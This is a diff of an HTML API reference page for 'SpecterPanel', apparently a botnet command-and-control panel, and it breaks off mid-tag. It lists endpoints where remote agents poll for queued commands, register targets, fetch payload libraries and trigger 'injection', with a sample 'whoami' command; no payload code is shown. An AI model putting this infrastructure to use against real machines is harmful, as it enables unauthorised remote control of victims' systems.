@@ -1,950 +1,473 @@
-<!doctype html>
-<html lang="en">
-<head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>SpecterPanel API Reference (Tailwind + Responsive)</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <style>
-    @keyframes fadeInUp {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-    @keyframes float {
-      0% { transform: translateY(0) rotate(0deg); }
-      100% { transform: translateY(-1000px) rotate(360deg); }
-    }
-  </style>
-</head>
-<body class="bg-[#0b0f19] text-[#e6f0ff] font-sans antialiased min-h-screen overflow-x-hidden max-w-full">
+{% extends 'base.html' %}
 
-  <!-- Particle container -->
-  <div class="particles fixed inset-0 pointer-events-none -z-10" id="particles"></div>
+{% block title %}SpecterPanel API Reference{% endblock %}
 
-  <!-- Mobile overlay -->
-  <div class="nav-overlay fixed inset-0 bg-black/70 backdrop-blur-sm z-[999] opacity-0 transition-opacity hidden" id="navOverlay"></div>
-
+{% block body %}
+<div class="max-w-7xl mx-auto px-4 py-8">
   <!-- Header -->
-  <header class="sticky top-0 z-[1000] px-4 sm:px-8 py-6 border-b border-white/10 bg-gradient-to-br from-[#0a1423]/95 to-[#08121e]/98 backdrop-blur-xl shadow-lg">
-    <div class="absolute top-0 left-0 right-0 h-px bg-gradient-to-r from-[#7bd389] to-[#5ac768] shadow-[0_0_20px_rgba(123,211,137,0.3)]"></div>
-    <button class="mobile-menu-btn md:hidden w-11 h-11 rounded-lg bg-[#7bd389]/10 border border-[#7bd389]/30 text-[#7bd389] text-2xl flex items-center justify-center transition-all hover:bg-[#7bd389]/20 hover:scale-105" id="mobileMenuBtn">☰</button>
-    <div class="mt-2 md:mt-0">
-      <h1 class="text-2xl sm:text-3xl font-bold bg-gradient-to-r from-[#7bd389] to-[#5ac768] bg-clip-text text-transparent tracking-tight">SpecterPanel API Reference</h1>
-      <p class="mt-3 text-[#8b9bb5] max-w-3xl text-sm sm:text-base">Complete documentation for SpecterPanel's Machine & Web APIs. Authenticate using your <strong class="text-white">API token</strong> in query parameters or JSON body. Examples provided in JavaScript (fetch), Python (requests), and cURL.</p>
-    </div>
-  </header>
+  <div class="mb-8 text-center md:text-left">
+    <h1 class="text-3xl md:text-4xl font-extrabold bg-gradient-to-r from-indigo-600 to-cyan-600 dark:from-indigo-400 dark:to-cyan-400 bg-clip-text text-transparent">
+      SpecterPanel API Reference
+    </h1>
+    <p class="text-slate-600 dark:text-slate-300 mt-2">
+      Complete documentation for Machine & Web APIs. Authenticate using your <strong class="text-indigo-600 dark:text-indigo-400">API token</strong> in query parameters or JSON body.
+    </p>
+  </div>
 
-  <!-- Main wrapper -->
-  <div class="flex flex-col md:flex-row min-h-[calc(100vh-120px)] max-w-full">
-
-    <!-- Sidebar navigation -->
-    <nav class="w-full md:w-80 bg-gradient-to-b from-[#0c1628]/95 to-[#081220]/90 backdrop-blur-md border-r border-white/10 overflow-y-auto p-6 fixed md:static inset-y-0 left-0 z-[1000] transform -translate-x-full md:translate-x-0 transition-transform duration-300 ease-[cubic-bezier(0.4,0,0.2,1)] shadow-2xl md:shadow-none" id="sidebar">
-      <!-- Close button for mobile -->
-      <button class="nav-close-btn md:hidden absolute top-4 right-4 w-9 h-9 rounded-lg bg-white/10 border border-white/10 text-[#8b9bb5] hover:bg-white/20 hover:text-white flex items-center justify-center text-xl" id="navCloseBtn">×</button>
-
-      <div class="logo flex items-center gap-2 text-[#7bd389] font-extrabold text-xl mb-3">
-        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="drop-shadow-[0_0_8px_rgba(123,211,137,0.3)]">
-          <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM12 20C7.59 20 4 16.41 4 12C4 7.59 7.59 4 12 4C16.41 4 20 7.59 20 12C20 16.41 16.41 20 12 20Z" fill="#7bd389"/>
-          <path d="M12 6C8.69 6 6 8.69 6 12C6 15.31 8.69 18 12 18C15.31 18 18 15.31 18 12C18 8.69 15.31 6 12 6ZM12 16C9.79 16 8 14.21 8 12C8 9.79 9.79 8 12 8C14.21 8 16 9.79 16 12C16 14.21 14.21 16 12 16Z" fill="#7bd389"/>
-        </svg>
-        SpecterPanel
+  <div class="flex flex-col lg:flex-row gap-8">
+    <!-- Sidebar Navigation -->
+    <aside class="lg:w-80 shrink-0">
+      <div class="sticky top-24 bg-white/50 dark:bg-slate-900/50 backdrop-blur-sm rounded-2xl border border-slate-200 dark:border-slate-700 p-4">
+        <div class="mb-4">
+          <div class="relative">
+            <input type="text" id="searchInput" placeholder="Search endpoints..." 
+                   class="w-full px-4 py-2 rounded-lg bg-slate-100 dark:bg-slate-800 border border-slate-200 dark:border-slate-700 text-slate-800 dark:text-slate-200 focus:outline-none focus:ring-2 focus:ring-indigo-500">
+            <i class="fas fa-search absolute right-3 top-3 text-slate-400"></i>
+          </div>
+        </div>
+        
+        <div class="space-y-6">
+          <!-- Machine API -->
+          <div>
+            <h3 class="text-xs font-bold uppercase tracking-wider text-indigo-600 dark:text-indigo-400 mb-3 flex items-center gap-2">
+              <i class="fas fa-microchip"></i> Machine API (api.py)
+            </h3>
+            <ul class="space-y-1" id="machineLinks">
+              <li><a href="#api_ApiCommand" class="nav-link-api block text-sm text-slate-600 dark:text-slate-400 hover:text-indigo-600 dark:hover:text-indigo-400 py-1">GET /api/ApiCommand/&lt;target_name&gt;</a></li>
+              <li><a href="#api_save_output" class="nav-link-api block text-sm text-slate-600 dark:text-slate-400 hover:text-indigo-600 dark:hover:text-indigo-400 py-1">POST /api/Apicommand/save_output</a></li>
+              <li><a href="#api_BotNet" class="nav-link-api block text-sm text-slate-600 dark:text-slate-400 hover:text-indigo-600 dark:hover:text-indigo-400 py-1">GET /api/BotNet/&lt;target_name&gt;</a></li>
+              <li><a href="#api_registor_target" class="nav-link-api block text-sm text-slate-600 dark:text-slate-400 hover:text-indigo-600 dark:hover:text-indigo-400 py-1">POST /api/registor_target</a></li>
+              <li><a href="#api_get_instraction" class="nav-link-api block text-sm text-slate-600 dark:text-slate-400 hover:text-indigo-600 dark:hover:text-indigo-400 py-1">GET /api/get_instraction/&lt;target_name&gt;</a></li>
+              <li><a href="#api_lib" class="nav-link-api block text-sm text-slate-600 dark:text-slate-400 hover:text-indigo-600 dark:hover:text-indigo-400 py-1">GET /api/lib/&lt;usePyload&gt;</a></li>
+              <li><a href="#api_injection" class="nav-link-api block text-sm text-slate-600 dark:text-slate-400 hover:text-indigo-600 dark:hover:text-indigo-400 py-1">GET|POST /api/injection/&lt;target_name&gt;</a></li>
+            </ul>
+          </div>
+          <!-- Web API -->
+          <div>
+            <h3 class="text-xs font-bold uppercase tracking-wider text-indigo-600 dark:text-indigo-400 mb-3 flex items-center gap-2">
+              <i class="fas fa-globe"></i> Web-side API (view.py)
+            </h3>
+            <ul class="space-y-1" id="webLinks">
+              <li><a href="#view_api_command" class="nav-link-api block text-sm text-slate-600 dark:text-slate-400 hover:text-indigo-600 dark:hover:text-indigo-400 py-1">GET|POST /api_command/&lt;targetName&gt;</a></li>
+              <li><a href="#view_check_update" class="nav-link-api block text-sm text-slate-600 dark:text-slate-400 hover:text-indigo-600 dark:hover:text-indigo-400 py-1">GET /check_command_update/&lt;target_name&gt;</a></li>
+              <li><a href="#view_delete_command" class="nav-link-api block text-sm text-slate-600 dark:text-slate-400 hover:text-indigo-600 dark:hover:text-indigo-400 py-1">POST /api_command/delete</a></li>
+              <li><a href="#view_api_command_api" class="nav-link-api block text-sm text-slate-600 dark:text-slate-400 hover:text-indigo-600 dark:hover:text-indigo-400 py-1">GET /api_command/api/&lt;targetName&gt;</a></li>
+              <li><a href="#view_api_link" class="nav-link-api block text-sm text-slate-600 dark:text-slate-400 hover:text-indigo-600 dark:hover:text-indigo-400 py-1">GET|POST /api_link</a></li>
+              <li><a href="#view_api_link_delete" class="nav-link-api block text-sm text-slate-600 dark:text-slate-400 hover:text-indigo-600 dark:hover:text-indigo-400 py-1">GET /api_link_delete/&lt;ID&gt;</a></li>
+              <li><a href="#view_api_link_update" class="nav-link-api block text-sm text-slate-600 dark:text-slate-400 hover:text-indigo-600 dark:hover:text-indigo-400 py-1">POST /api_link_update/&lt;ID&gt;</a></li>
+            </ul>
+          </div>
+        </div>
+        <div class="mt-6 pt-4 border-t border-slate-200 dark:border-slate-700 text-xs text-slate-500">
+          <p>Replace <code class="bg-slate-100 dark:bg-slate-800 px-1 rounded">SERVER</code> with your panel URL.</p>
+          <a href="/" class="block mt-3 text-indigo-600 dark:text-indigo-400 hover:underline">← Back to Dashboard</a>
+        </div>
       </div>
-      <small class="block text-[#8b9bb5] mb-5 text-sm leading-relaxed p-3 bg-white/5 rounded-lg border border-white/10">Authentication: Include <code class="bg-[#7bd389]/10 text-[#7bd389] px-1.5 py-0.5 rounded border border-[#7bd389]/20 break-all">token</code> in query parameters (GET) or JSON body (POST) for all API requests.</small>
+    </aside>
 
-      <!-- Search box -->
-      <div class="search-box relative mb-6">
-        <input type="text" id="searchInput" placeholder="Search endpoints..." class="w-full p-3 pl-4 pr-12 bg-black/30 border border-white/10 rounded-lg text-white placeholder-[#8b9bb5] focus:outline-none focus:border-[#7bd389] focus:ring-2 focus:ring-[#7bd389]/30 transition-all">
-        <span class="absolute right-4 top-1/2 -translate-y-1/2 text-[#8b9bb5]">🔍</span>
-      </div>
-
-      <!-- Machine API section -->
-      <div class="nav-section mt-7">
-        <div class="nav-section-title flex items-center gap-2 text-[#7bd389] text-xs font-bold uppercase tracking-wide mb-4 before:content-[''] before:w-1 before:h-4 before:bg-gradient-to-b from-[#7bd389] to-[#5ac768] before:rounded-full">Machine API (api.py)</div>
-        <a href="#api_ApiCommand" class="nav-link block p-3 rounded-lg text-[#8b9bb5] hover:text-white hover:bg-gradient-to-r hover:from-white/5 hover:to-white/2 hover:border-white/10 border border-transparent transition-all duration-300 mb-1.5 text-sm relative overflow-hidden group before:absolute before:top-0 before:-left-full before:w-full before:h-full before:bg-gradient-to-r before:from-transparent before:via-[#7bd389]/10 before:to-transparent before:transition-all before:duration-600 hover:before:left-full break-words">GET /api/ApiCommand/&lt;target_name&gt;</a>
-        <a href="#api_save_output" class="nav-link block p-3 rounded-lg text-[#8b9bb5] hover:text-white hover:bg-gradient-to-r hover:from-white/5 hover:to-white/2 hover:border-white/10 border border-transparent transition-all duration-300 mb-1.5 text-sm relative overflow-hidden group before:absolute before:top-0 before:-left-full before:w-full before:h-full before:bg-gradient-to-r before:from-transparent before:via-[#7bd389]/10 before:to-transparent before:transition-all before:duration-600 hover:before:left-full break-words">POST /api/Apicommand/save_output</a>
-        <a href="#api_BotNet" class="nav-link block p-3 rounded-lg text-[#8b9bb5] hover:text-white hover:bg-gradient-to-r hover:from-white/5 hover:to-white/2 hover:border-white/10 border border-transparent transition-all duration-300 mb-1.5 text-sm relative overflow-hidden group before:absolute before:top-0 before:-left-full before:w-full before:h-full before:bg-gradient-to-r before:from-transparent before:via-[#7bd389]/10 before:to-transparent before:transition-all before:duration-600 hover:before:left-full break-words">GET /api/BotNet/&lt;target_name&gt;</a>
-        <a href="#api_registor_target" class="nav-link block p-3 rounded-lg text-[#8b9bb5] hover:text-white hover:bg-gradient-to-r hover:from-white/5 hover:to-white/2 hover:border-white/10 border border-transparent transition-all duration-300 mb-1.5 text-sm relative overflow-hidden group before:absolute before:top-0 before:-left-full before:w-full before:h-full before:bg-gradient-to-r before:from-transparent before:via-[#7bd389]/10 before:to-transparent before:transition-all before:duration-600 hover:before:left-full break-words">POST /api/registor_target</a>
-        <a href="#api_get_instraction" class="nav-link block p-3 rounded-lg text-[#8b9bb5] hover:text-white hover:bg-gradient-to-r hover:from-white/5 hover:to-white/2 hover:border-white/10 border border-transparent transition-all duration-300 mb-1.5 text-sm relative overflow-hidden group before:absolute before:top-0 before:-left-full before:w-full before:h-full before:bg-gradient-to-r before:from-transparent before:via-[#7bd389]/10 before:to-transparent before:transition-all before:duration-600 hover:before:left-full break-words">GET /api/get_instraction/&lt;target_name&gt;</a>
-        <a href="#api_lib" class="nav-link block p-3 rounded-lg text-[#8b9bb5] hover:text-white hover:bg-gradient-to-r hover:from-white/5 hover:to-white/2 hover:border-white/10 border border-transparent transition-all duration-300 mb-1.5 text-sm relative overflow-hidden group before:absolute before:top-0 before:-left-full before:w-full before:h-full before:bg-gradient-to-r before:from-transparent before:via-[#7bd389]/10 before:to-transparent before:transition-all before:duration-600 hover:before:left-full break-words">GET /api/lib/&lt;usePyload&gt;</a>
-        <a href="#api_injection" class="nav-link block p-3 rounded-lg text-[#8b9bb5] hover:text-white hover:bg-gradient-to-r hover:from-white/5 hover:to-white/2 hover:border-white/10 border border-transparent transition-all duration-300 mb-1.5 text-sm relative overflow-hidden group before:absolute before:top-0 before:-left-full before:w-full before:h-full before:bg-gradient-to-r before:from-transparent before:via-[#7bd389]/10 before:to-transparent before:transition-all before:duration-600 hover:before:left-full break-words">GET|POST /api/injection/&lt;target_name&gt;</a>
-      </div>
-
-      <!-- Web-side API section -->
-      <div class="nav-section mt-7">
-        <div class="nav-section-title flex items-center gap-2 text-[#7bd389] text-xs font-bold uppercase tracking-wide mb-4 before:content-[''] before:w-1 before:h-4 before:bg-gradient-to-b from-[#7bd389] to-[#5ac768] before:rounded-full">Web-side API (view.py)</div>
-        <a href="#view_api_command" class="nav-link block p-3 rounded-lg text-[#8b9bb5] hover:text-white hover:bg-gradient-to-r hover:from-white/5 hover:to-white/2 hover:border-white/10 border border-transparent transition-all duration-300 mb-1.5 text-sm relative overflow-hidden group before:absolute before:top-0 before:-left-full before:w-full before:h-full before:bg-gradient-to-r before:from-transparent before:via-[#7bd389]/10 before:to-transparent before:transition-all before:duration-600 hover:before:left-full break-words">GET|POST /api_command/&lt;targetName&gt;</a>
-        <a href="#view_check_update" class="nav-link block p-3 rounded-lg text-[#8b9bb5] hover:text-white hover:bg-gradient-to-r hover:from-white/5 hover:to-white/2 hover:border-white/10 border border-transparent transition-all duration-300 mb-1.5 text-sm relative overflow-hidden group before:absolute before:top-0 before:-left-full before:w-full before:h-full before:bg-gradient-to-r before:from-transparent before:via-[#7bd389]/10 before:to-transparent before:transition-all before:duration-600 hover:before:left-full break-words">GET /check_command_update/&lt;target_name&gt;</a>
-        <a href="#view_delete_command" class="nav-link block p-3 rounded-lg text-[#8b9bb5] hover:text-white hover:bg-gradient-to-r hover:from-white/5 hover:to-white/2 hover:border-white/10 border border-transparent transition-all duration-300 mb-1.5 text-sm relative overflow-hidden group before:absolute before:top-0 before:-left-full before:w-full before:h-full before:bg-gradient-to-r before:from-transparent before:via-[#7bd389]/10 before:to-transparent before:transition-all before:duration-600 hover:before:left-full break-words">POST /api_command/delete</a>
-        <a href="#view_api_command_api" class="nav-link block p-3 rounded-lg text-[#8b9bb5] hover:text-white hover:bg-gradient-to-r hover:from-white/5 hover:to-white/2 hover:border-white/10 border border-transparent transition-all duration-300 mb-1.5 text-sm relative overflow-hidden group before:absolute before:top-0 before:-left-full before:w-full before:h-full before:bg-gradient-to-r before:from-transparent before:via-[#7bd389]/10 before:to-transparent before:transition-all before:duration-600 hover:before:left-full break-words">GET /api_command/api/&lt;targetName&gt;</a>
-        <a href="#view_api_link" class="nav-link block p-3 rounded-lg text-[#8b9bb5] hover:text-white hover:bg-gradient-to-r hover:from-white/5 hover:to-white/2 hover:border-white/10 border border-transparent transition-all duration-300 mb-1.5 text-sm relative overflow-hidden group before:absolute before:top-0 before:-left-full before:w-full before:h-full before:bg-gradient-to-r before:from-transparent before:via-[#7bd389]/10 before:to-transparent before:transition-all before:duration-600 hover:before:left-full break-words">GET|POST /api_link</a>
-        <a href="#view_api_link_delete" class="nav-link block p-3 rounded-lg text-[#8b9bb5] hover:text-white hover:bg-gradient-to-r hover:from-white/5 hover:to-white/2 hover:border-white/10 border border-transparent transition-all duration-300 mb-1.5 text-sm relative overflow-hidden group before:absolute before:top-0 before:-left-full before:w-full before:h-full before:bg-gradient-to-r before:from-transparent before:via-[#7bd389]/10 before:to-transparent before:transition-all before:duration-600 hover:before:left-full break-words">GET /api_link_delete/&lt;ID&gt;</a>
-        <a href="#view_api_link_update" class="nav-link block p-3 rounded-lg text-[#8b9bb5] hover:text-white hover:bg-gradient-to-r hover:from-white/5 hover:to-white/2 hover:border-white/10 border border-transparent transition-all duration-300 mb-1.5 text-sm relative overflow-hidden group before:absolute before:top-0 before:-left-full before:w-full before:h-full before:bg-gradient-to-r before:from-transparent before:via-[#7bd389]/10 before:to-transparent before:transition-all before:duration-600 hover:before:left-full break-words">POST /api_link_update/&lt;ID&gt;</a>
-      </div>
-
-      <!-- Sidebar footer -->
-      <div class="nav-footer mt-8 pt-5 border-t border-white/10 text-[#8b9bb5] text-xs">
-        <div class="mb-3 font-semibold text-[#7bd389]">Placeholders used:</div>
-        <code class="block bg-[#7bd389]/10 text-[#7bd389] px-2 py-1 rounded border border-[#7bd389]/20 mb-1 text-xs break-words">token=ABC123</code>
-        <code class="block bg-[#7bd389]/10 text-[#7bd389] px-2 py-1 rounded border border-[#7bd389]/20 mb-1 text-xs break-words">target_name=demo_target</code>
-        <code class="block bg-[#7bd389]/10 text-[#7bd389] px-2 py-1 rounded border border-[#7bd389]/20 text-xs break-words">SERVER=your-server.com</code>
-        <a href="/" class="block mt-4 p-3 bg-[#7bd389]/10 rounded-lg text-[#7bd389] text-center border border-[#7bd389]/30 hover:bg-[#7bd389]/20 transition-all no-underline break-words">← Back to Dashboard</a>
-      </div>
-    </nav>
-
-    <!-- Main content area -->
-    <main class="flex-1 overflow-auto p-4 md:p-8 space-y-8 max-w-full">
-
-      <!-- INTRODUCTION -->
-      <section class="p-6 md:p-8 bg-gradient-to-br from-white/5 to-white/2 rounded-xl border border-white/10 shadow-lg backdrop-blur-md relative animate-[fadeInUp_0.6s_ease-out] before:absolute before:top-0 before:left-0 before:right-0 before:h-0.5 before:bg-gradient-to-r before:from-[#7bd389] before:to-[#5ac768] before:opacity-70">
-        <h2 class="text-2xl font-bold text-white mb-4 tracking-tight">Introduction</h2>
-        <p class="text-[#e6f0ff] mb-5">This document provides comprehensive documentation for the SpecterPanel API, including both machine-facing endpoints (used by remote agents) and web-facing endpoints (used by the dashboard interface).</p>
-
-        <h3 class="text-xl font-semibold text-white mt-6 mb-3">Authentication</h3>
-        <p class="mb-3">All API requests require authentication via an API token. There are two ways to provide the token:</p>
-        <ul class="list-disc ml-6 mb-4 text-[#e6f0ff] break-words">
-          <li><strong>GET requests:</strong> Include as a query parameter (<code class="bg-[#7bd389]/10 text-[#7bd389] px-1.5 py-0.5 rounded border border-[#7bd389]/20 break-all">?token=ABC123</code>)</li>
-          <li><strong>POST requests:</strong> Include in the JSON request body (<code class="bg-[#7bd389]/10 text-[#7bd389] px-1.5 py-0.5 rounded border border-[#7bd389]/20 break-all">{"token":"ABC123"}</code>)</li>
+    <!-- Main Content -->
+    <main class="flex-1 space-y-8">
+      <!-- Introduction -->
+      <section class="rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 p-6 shadow-sm">
+        <h2 class="text-2xl font-bold text-slate-800 dark:text-slate-100 mb-4">Introduction</h2>
+        <p class="text-slate-600 dark:text-slate-300 mb-4">Complete documentation for the SpecterPanel API, including both machine-facing endpoints (used by remote agents) and web-facing endpoints (used by the dashboard interface).</p>
+        <h3 class="text-xl font-semibold text-slate-800 dark:text-slate-100 mt-6 mb-3">Authentication</h3>
+        <p class="mb-3">All API requests require authentication via an API token:</p>
+        <ul class="list-disc list-inside text-slate-600 dark:text-slate-300 mb-4">
+          <li><strong>GET requests:</strong> Include as query parameter <code class="bg-slate-100 dark:bg-slate-800 px-1 rounded">?token=ABC123</code></li>
+          <li><strong>POST requests:</strong> Include in JSON body <code class="bg-slate-100 dark:bg-slate-800 px-1 rounded">{"token":"ABC123"}</code></li>
         </ul>
-
-        <h3 class="text-xl font-semibold text-white mt-6 mb-3">Base URL</h3>
-        <p class="mb-3">All examples use <code class="bg-[#7bd389]/10 text-[#7bd389] px-1.5 py-0.5 rounded border border-[#7bd389]/20 break-all">SERVER</code> as a placeholder for your server's base URL (e.g., <code class="bg-[#7bd389]/10 text-[#7bd389] px-1.5 py-0.5 rounded border border-[#7bd389]/20 break-all">https://panel.example.com</code>). Replace this with your actual server address when making requests.</p>
-
-        <h3 class="text-xl font-semibold text-white mt-6 mb-3">Rate Limiting</h3>
-        <p>The API enforces rate limits to prevent abuse. If you exceed the limit, you'll receive a <code class="bg-[#7bd389]/10 text-[#7bd389] px-1.5 py-0.5 rounded border border-[#7bd389]/20 break-all">429 Too Many Requests</code> response. Wait before making additional requests.</p>
+        <h3 class="text-xl font-semibold text-slate-800 dark:text-slate-100 mt-6 mb-3">Base URL</h3>
+        <p>All examples use <code class="bg-slate-100 dark:bg-slate-800 px-1 rounded">SERVER</code> as placeholder for your server's base URL.</p>
       </section>
 
       <!-- ========== MACHINE API ENDPOINTS ========== -->
 
-      <!-- 1. /api/ApiCommand/<target_name> -->
-      <section id="api_ApiCommand" class="p-6 md:p-8 bg-gradient-to-br from-white/5 to-white/2 rounded-xl border border-white/10 shadow-lg backdrop-blur-md relative animate-[fadeInUp_0.6s_ease-out] before:absolute before:top-0 before:left-0 before:right-0 before:h-0.5 before:bg-gradient-to-r before:from-[#7bd389] before:to-[#5ac768] before:opacity-70">
-        <div class="flex flex-wrap items-center gap-4 mb-4">
-          <span class="bg-gradient-to-r from-[#7bd389] to-[#5ac768] text-[#0b0f19] px-3 py-1.5 rounded-full text-xs font-bold uppercase tracking-wide shadow-[0_4px_12px_rgba(123,211,137,0.3)]">GET</span>
-          <h2 class="font-mono text-lg sm:text-xl text-white bg-black/30 px-4 py-2 rounded-lg border border-white/10 break-words max-w-full">/api/ApiCommand/&lt;target_name&gt;</h2>
+      <!-- 1. GET /api/ApiCommand/<target_name> -->
+      <section id="api_ApiCommand" class="rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 p-6 shadow-sm scroll-mt-24">
+        <div class="flex flex-wrap items-center gap-3 mb-4">
+          <span class="px-3 py-1 rounded-full text-xs font-bold bg-indigo-100 text-indigo-700 dark:bg-indigo-900/50 dark:text-indigo-300">GET</span>
+          <code class="text-lg font-mono text-slate-800 dark:text-slate-200 break-all">/api/ApiCommand/&lt;target_name&gt;</code>
         </div>
-        <div class="endpoint-summary mb-5">
-          <p class="mb-3">Retrieve pending commands for a specific target. Remote agents should periodically poll this endpoint to check for new commands.</p>
-          <p class="text-sm p-3 bg-black/20 border-l-4 border-[#7bd389] rounded text-[#8b9bb5] break-words"><strong>Note:</strong> Agents should include their IP and OS information when available to help with command targeting.</p>
-        </div>
-        <h3 class="text-lg font-semibold text-white mt-6 mb-3">Parameters</h3>
+        <p class="text-slate-600 dark:text-slate-300 mb-4">Retrieve pending commands for a specific target. Remote agents should periodically poll this endpoint.</p>
+        <h4 class="font-semibold text-slate-800 dark:text-slate-100 mt-4 mb-2">Parameters</h4>
         <div class="overflow-x-auto">
-          <table class="w-full text-sm border-collapse bg-black/20 rounded-lg shadow-md">
-            <thead>
-              <tr class="border-b border-white/10 bg-gradient-to-r from-[#7bd389]/10 to-[#7bd389]/5">
-                <th class="p-4 text-left font-semibold text-[#7bd389] uppercase text-xs tracking-wide">Name</th>
-                <th class="p-4 text-left font-semibold text-[#7bd389] uppercase text-xs tracking-wide">Type</th>
-                <th class="p-4 text-left font-semibold text-[#7bd389] uppercase text-xs tracking-wide">Location</th>
-                <th class="p-4 text-left font-semibold text-[#7bd389] uppercase text-xs tracking-wide">Required</th>
-                <th class="p-4 text-left font-semibold text-[#7bd389] uppercase text-xs tracking-wide">Description</th>
-              </tr>
+          <table class="min-w-full text-sm">
+            <thead class="bg-slate-50 dark:bg-slate-800/50">
+              <tr><th class="p-2 text-left">Name</th><th class="p-2 text-left">Type</th><th class="p-2 text-left">Location</th><th class="p-2 text-left">Required</th><th class="p-2 text-left">Description</th></tr>
             </thead>
             <tbody>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">token</td><td class="p-4">string</td><td class="p-4">query</td><td class="p-4"><span class="text-[#ff6b6b] font-bold">*</span></td><td class="p-4">API token for authentication</td></tr>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">ip</td><td class="p-4">string</td><td class="p-4">query</td><td class="p-4"></td><td class="p-4">Agent's IP address (optional but recommended)</td></tr>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">os</td><td class="p-4">string</td><td class="p-4">query</td><td class="p-4"></td><td class="p-4">Agent's operating system (optional but recommended)</td></tr>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">target_name</td><td class="p-4">string</td><td class="p-4">path</td><td class="p-4"><span class="text-[#ff6b6b] font-bold">*</span></td><td class="p-4">Unique identifier for the target machine</td></tr>
+              <tr class="border-t border-slate-200 dark:border-slate-700"><td class="p-2">token</td><td>string</td><td>query</td><td>✓</td><td>API token</td></tr>
+              <tr class="border-t border-slate-200 dark:border-slate-700"><td class="p-2">target_name</td><td>string</td><td>path</td><td>✓</td><td>Target identifier</td></tr>
+              <tr class="border-t border-slate-200 dark:border-slate-700"><td class="p-2">ip</td><td>string</td><td>query</td><td></td><td>Agent IP (optional)</td></tr>
+              <tr class="border-t border-slate-200 dark:border-slate-700"><td class="p-2">os</td><td>string</td><td>query</td><td></td><td>Agent OS (optional)</td></tr>
             </tbody>
           </table>
         </div>
-        <h3 class="text-lg font-semibold text-white mt-6 mb-3">Responses</h3>
-        <div class="grid md:grid-cols-2 gap-4 mb-4">
-          <div>
-            <p class="text-sm p-2 bg-[#7bd389]/20 text-[#7bd389] border border-[#7bd389]/30 rounded inline-block break-words"><span class="bg-[#7bd389]/30 px-2 py-0.5 rounded mr-2">200</span> Success</p>
-            <pre class="code mt-2 p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto relative before:absolute before:top-0 before:left-0 before:right-0 before:h-px before:bg-gradient-to-r before:from-[#7bd389] before:to-[#5ac768] before:opacity-50">{
-  "allCommand": [
-    ["ID", "email", "target_name", "command", "condition", "update"],
-    ["cmd123", "admin@example.com", "demo_target", "whoami", "linux", "2023-08-11 12:00:00"],
-    ...
-  ]
-}</pre>
+        <h4 class="font-semibold text-slate-800 dark:text-slate-100 mt-4 mb-2">Responses</h4>
+        <div class="space-y-2">
+          <div><span class="text-sm bg-green-100 text-green-700 dark:bg-green-900/30 dark:text-green-400 px-2 py-1 rounded">200 Success</span>
+            <pre class="mt-2 bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>{
+  "allCommand": [["ID", "email", "target_name", "command", "condition", "update"], ...]
+}</code></pre>
           </div>
-          <div>
-            <p class="text-sm p-2 bg-[#e06c75]/20 text-[#e06c75] border border-[#e06c75]/30 rounded inline-block break-words"><span class="bg-[#e06c75]/30 px-2 py-0.5 rounded mr-2">403</span> Invalid token</p>
-            <pre class="code mt-2 p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto">{ "Error": "Invalid token" }</pre>
+          <div><span class="text-sm bg-rose-100 text-rose-700 dark:bg-rose-900/30 dark:text-rose-400 px-2 py-1 rounded">403 Invalid token</span>
+            <pre class="mt-2 bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>{ "Error": "Invalid token" }</code></pre>
           </div>
         </div>
-        <!-- Code tabs -->
-        <div class="code-toolbar flex flex-wrap justify-between items-center gap-4 mt-5">
-          <div class="tabs flex gap-1 bg-black/30 p-1 rounded-lg border border-white/10">
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition active bg-gradient-to-r from-[#7bd389] to-[#5ac768] text-[#0b0f19] shadow-md" data-target="api_ApiCommand-js">JavaScript</button>
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition" data-target="api_ApiCommand-py">Python</button>
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition" data-target="api_ApiCommand-curl">cURL</button>
+        <div class="mt-4">
+          <div class="flex gap-2 mb-2">
+            <button data-tab="js" data-parent="api_ApiCommand" class="tab-btn-api px-3 py-1 text-sm rounded bg-indigo-600 text-white">JavaScript</button>
+            <button data-tab="py" data-parent="api_ApiCommand" class="tab-btn-api px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 text-slate-700 dark:text-slate-300">Python</button>
+            <button data-tab="curl" data-parent="api_ApiCommand" class="tab-btn-api px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 text-slate-700 dark:text-slate-300">cURL</button>
+            <button data-copy-target="api_ApiCommand-js" class="copy-btn-api ml-auto px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 hover:bg-slate-300 dark:hover:bg-slate-600 transition">Copy</button>
           </div>
-          <button class="copy-btn flex items-center gap-2 px-4 py-2 bg-[#7bd389]/10 border border-[#7bd389]/30 rounded-lg text-[#7bd389] text-xs font-medium hover:bg-[#7bd389]/20 hover:-translate-y-0.5 hover:shadow-lg transition" data-copy-target="api_ApiCommand-js">
